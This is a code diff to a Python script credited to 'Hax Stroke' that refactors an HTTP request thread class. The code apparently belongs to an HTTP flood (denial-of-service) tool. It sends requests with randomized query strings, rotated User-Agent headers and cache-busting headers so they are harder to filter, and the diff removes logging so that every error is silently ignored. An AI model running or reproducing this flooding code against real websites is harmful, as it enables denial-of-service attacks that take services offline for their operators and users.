@@ -7,7 +7,7 @@
 #
 # author : Hax Stroke  , version 1.0
 # ----------------------------------------------------------------------------------------------
-
+import time
 import urllib
 import urllib.request
 import sys
@@ -4846,27 +4846,16 @@ def show_usage():
 
 # http caller thread
 class HTTPThread(threading.Thread):
-    def __init__(self, _url, _host, **kwargs):
+    def __init__(self, url, host, **kwargs):
         super().__init__(**kwargs)
-        self._url = _url
-        self._host = _host
-
-    @property
-    def url(self):
-        return self._url
-
-    @property
-    def host(self):
-        return self._host
+        self.url = url
+        self.host = host
+        self.param_joiner = '&' if self.url.count('?') > 0 else '?'
 
     # http request
     def httpcall(self):
-        from datetime import datetime
-
-        param_joiner = '&' if self.url.count('?') > 0 else '?'
-
         request = urllib.request.Request(
-            self.url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
+            self.url + self.param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
         request.add_header('User-Agent', random.choice(headers_useragents))
         request.add_header('Cache-Control', 'no-cache')
         request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -4878,9 +4867,8 @@ class HTTPThread(threading.Thread):
         try:
             with urllib.request.urlopen(request) as f:
                 pass
-            print(datetime.now(), 'sended', f.status)
-        except Exception as e:
-            print(datetime.now(), 'ignore exception: {}'.format(e))
+        except:
+            pass
 
     def run(self):
         self.httpcall()
